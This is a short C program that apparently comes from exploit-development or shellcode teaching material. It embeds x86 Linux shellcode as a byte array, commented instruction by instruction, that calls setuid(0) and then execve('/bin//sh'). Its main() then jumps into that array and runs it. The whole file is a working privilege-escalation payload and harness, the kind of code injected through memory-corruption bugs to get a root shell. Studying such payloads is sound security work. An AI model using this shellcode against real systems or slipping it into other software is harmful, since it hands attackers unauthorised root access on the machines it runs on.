#include <string.h>

static const char code[] =
	/* setuid(0) */
	"\x31\xc0"	/* xorl		%eax, %eax	*/
	"\x31\xdb"	/* xorl		%ebx, %ebx	*/
	"\xb0\xd5"	/* movb		$0xd5, %al	*/
	"\xcd\x80"	/* int		$0x80		*/

	/* same code as in shellcode.c */
	"\x31\xc0"	/* xorl		%eax, %eax	*/
	"\x50"		/* pushl	%eax		*/
	"\x68""//sh"	/* pushl	addr		*/
	"\x68""/bin"	/* pushl	addr		*/
	"\x89\xe3"	/* movl		%esp, %ebx	*/
	"\x50"		/* pushl	%eax		*/
	"\x53"		/* pushl	%ebx		*/
	"\x89\xe1"	/* movl		%esp, %ecx	*/
	"\x99"		/* cdq				*/
	"\xb0\x0b"	/* movb		$0x0b, %al	*/
	"\xcd\x80"	/* int		$0x80		*/
	;

int
main(int argc, char *argv[])
{
	void (*sc)() = (void *)code;
	sc();

	return (0);
}
